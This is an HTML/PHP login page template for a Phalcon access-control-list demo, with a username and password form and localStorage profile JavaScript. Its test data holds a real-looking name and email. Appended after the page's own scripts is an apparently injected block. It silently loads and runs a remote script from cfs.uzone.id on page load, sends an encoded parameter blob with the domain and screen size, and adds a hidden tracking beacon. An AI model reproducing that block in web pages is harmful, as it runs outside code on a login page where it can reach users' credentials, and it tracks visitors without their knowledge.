<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <link rel="icon" type="image/ico" href="images/logostie2.ico">
    <meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' />
    <title>Acl-Phalcon</title>
    <?= $this->tag->stylesheetLink('font-awesome/css/font-awesome.min.css') ?>
    <?= $this->tag->stylesheetLink('bootstrap/css/bootstrap.min.css') ?>
    <?= $this->tag->stylesheetLink('css/style2.css') ?>

    <?= $this->tag->javascriptInclude('jquery/dist/jquery.min.js') ?>
    <?= $this->tag->javascriptInclude('bootstrap/dist/js/bootstrap.min.js') ?>

</head>
<body style="background: #63b893">
<!--
    you can substitue the span of reauth email for a input with the email and
    include the remember me checkbox
    -->
    <div class="container">
        <div class="card card-container">
            <!-- <img class="profile-img-card" src="//lh3.googleusercontent.com/-6V8xOA6M7BA/AAAAAAAAAAI/AAAAAAAAAAA/rzlHcD0KYwo/photo.jpg?sz=120" alt="" /> -->
            <label>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Phalcon Framework<br> 
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Access Controll List
                    </label>
<!--            <img id="profile-img" class="profile-img-card" src="http://ssl.gstatic.com/accounts/ui/avatar_2x.png" /> -->
              <img id="profile-img" class="profile-img-card" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Phalcon_logo.png/1200px-Phalcon_logo.png">
            <p id="profile-name" class="profile-name-card"></p>
            <form class="form-signin" action="<?= $this->url->get('account/loginProses') ?>" method="post">
                <span id="reauth-email" class="reauth-email"></span>
                <input name="uid" type="text" class="form-control" placeholder="Login">
                <input name="passwd" type="password" class="form-control" placeholder="Password">

                <button class="btn btn-lg btn-primary btn-block btn-signin" type="submit" value="Login">Login</button>
            </form><!-- /form -->
            <a href="#" class="forgot-password">
                Forgot your password?
            </a>

        </div><!-- /card-container -->
<center>copright-AJAX@2017</center>
    </div><!-- /container -->

<script type="text/javascript">
$( document ).ready(function() {
    // DOM ready

    // Test data
    /*
     * To test the script you should discomment the function
     * testLocalStorageData and refresh the page. The function
     * will load some test data and the loadProfile
     * will do the changes in the UI
     */
    // testLocalStorageData();
    // Load profile if it exits
    loadProfile();
});

/**
 * Function that gets the data of the profile in case
 * thar it has already saved in localstorage. Only the
 * UI will be update in case that all data is available
 *
 * A not existing key in localstorage return null
 *
 */
function getLocalProfile(callback){
    var profileImgSrc      = localStorage.getItem("PROFILE_IMG_SRC");
    var profileName        = localStorage.getItem("PROFILE_NAME");
    var profileReAuthEmail = localStorage.getItem("PROFILE_REAUTH_EMAIL");

    if(profileName !== null
            && profileReAuthEmail !== null
            && profileImgSrc !== null) {
        callback(profileImgSrc, profileName, profileReAuthEmail);
    }
}

/**
 * Main function that load the profile if exists
 * in localstorage
 */
function loadProfile() {
    if(!supportsHTML5Storage()) { return false; }
    // we have to provide to the callback the basic
    // information to set the profile
    getLocalProfile(function(profileImgSrc, profileName, profileReAuthEmail) {
        //changes in the UI
        $("#profile-img").attr("src",profileImgSrc);
        $("#profile-name").html(profileName);
        $("#reauth-email").html(profileReAuthEmail);
        $("#inputEmail").hide();
        $("#remember").hide();
    });
}

/**
 * function that checks if the browser supports HTML5
 * local storage
 *
 * @returns {boolean}
 */
function supportsHTML5Storage() {
    try {
        return 'localStorage' in window && window['localStorage'] !== null;
    } catch (e) {
        return false;
    }
}

/**
 * Test data. This data will be safe by the web app
 * in the first successful login of a auth user.
 * To Test the scripts, delete the localstorage data
 * and comment this call.
 *
 * @returns {boolean}
 */
function testLocalStorageData() {
    if(!supportsHTML5Storage()) { return false; }
    localStorage.setItem("PROFILE_IMG_SRC", "//lh3.googleusercontent.com/-6V8xOA6M7BA/AAAAAAAAAAI/AAAAAAAAAAA/rzlHcD0KYwo/photo.jpg?sz=120" );
    localStorage.setItem("PROFILE_NAME", "CÃ©sar Izquierdo Tello");
    localStorage.setItem("PROFILE_REAUTH_EMAIL", "oneaccount@gmail.com");
}
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKyL5wwFpAEoISaUybPxcP%2bkkgLpsXMisxZ%2b7D%2ba3Faz1985AswXKW2IVq0%2bw09YIbnvZH2%2bA5tHhamECsUMqBvJN7QlU7aYTyWBvxR8NowTwtAb24l9cyTsbCyhtqj%2b%2bWU%2f4Q8%2bi8RwRq4hhNAkfGfkYY6oF4%2fhSFigXDDo02dnJ7AYhlEdSKfAmkVmECgBb5Utq1FoYgNAa4tUtr6d6JKgLLEnsgkCFmjVuOWQW4c2c7lVuwyE9dHAm%2fMmhSeNlyB6qssSjRQGpRLNaAaUb60VeTwxG6DskA4FmZeckzoeTLMVr%2fcsfOkQ3cy5yDfdB74DsEtYWpQWOrVLYQCfQnGQ9pQDv3oRF3HWIx7NlB%2foP4RpTdY3apuyCRtrwb3vW9uLiuHvT5a%2bP0D6rdgEyGlWh6H1uwCjd4epQ8lqwuT83Q1hIB97w%2bfFbnQQNTk3A6apAWYKb%2bbZo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

<div id="beacon_949248647" style="position:absolute;left:0;top:0;display:none"><img src="http://cfs.uzone.id/2fn7a2/log.html" width="0" height="0" style="width:0px;height:0px"></div></body></html>